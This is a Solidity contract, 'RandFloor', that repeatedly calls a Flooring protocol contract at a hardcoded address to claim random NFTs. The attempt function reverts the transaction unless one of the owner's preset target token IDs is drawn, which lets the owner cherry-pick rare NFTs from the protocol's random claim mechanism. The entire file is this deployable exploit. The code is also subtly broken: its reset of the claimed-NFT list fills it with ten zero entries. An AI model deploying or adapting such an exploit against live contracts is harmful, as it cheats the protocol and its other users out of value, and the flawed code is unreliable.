// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IFlooring {
    function claimRandomNFT(
        address collection,
        uint256 claimCnt,
        uint256 maxCreditCost,
        address receiver
    ) external returns (uint256);
}

import "./IERC721.sol";
import "./IERC20.sol";

contract RandFloor {

    IFlooring public flooring = IFlooring(0x3eb879cc9a0Ef4C6f1d870A40ae187768c278Da2);
    uint256 maxCreditCost = 25000000000000000000000;

    // list of all nfts claimed
    uint256[] public claimedNFTs;

    // target ids
    mapping (address=>uint256[]) public target_ids;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attempt(
        address collection_address,
        address mu_token_address,
        uint256 claimCnt
    ) public {
        require(msg.sender == owner, "only owner can call this function");

        IERC20 mu_token = IERC20(mu_token_address);
        IERC721 collection = IERC721(collection_address);

        // check balance
        uint256 balance = mu_token.balanceOf(address(this));
        // revert if not enough balance
        if (balance < claimCnt * 1_000_000 ether) {
            revert("balance less than claimCnt * 1_000_000 ether");
        }

        flooring.claimRandomNFT(
            collection_address,
            claimCnt,
            maxCreditCost,
            address(this) // receiver
        );

        // check through all claimed nfts to see if there are any targets
        bool success = false;

        for (uint256 i = 0; i < claimedNFTs.length; i++) {
            uint256 tokenId = claimedNFTs[i];

            // transfer to owner
            collection.safeTransferFrom(address(this), owner, tokenId);

            // check if this is a target
            for (uint256 j = 0; j < target_ids[collection_address].length; j++) {
                if (tokenId == target_ids[collection_address][j]) {
                    success = true;
                    break;
                }
            }
        }

        if (!success) {
            revert("no target found");
        }

        // reset claimedNFTs
        claimedNFTs = new uint256[](10);
    }

    function setTargets(address collection, uint256[] memory targets) public {
        require(msg.sender == owner, "only owner can call this function");

        target_ids[collection] = targets;
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 tokenId,
        bytes calldata _data
    ) external returns (bytes4) {
        claimedNFTs.push(tokenId);
        return this.onERC721Received.selector;
    }

    function withdraw_tokens(
        address token
    ) public {
        require(msg.sender == owner, "only owner can call this function");

        IERC20 token_contract = IERC20(token);
        uint256 balance = token_contract.balanceOf(address(this));
        token_contract.transfer(owner, balance);
    }
}
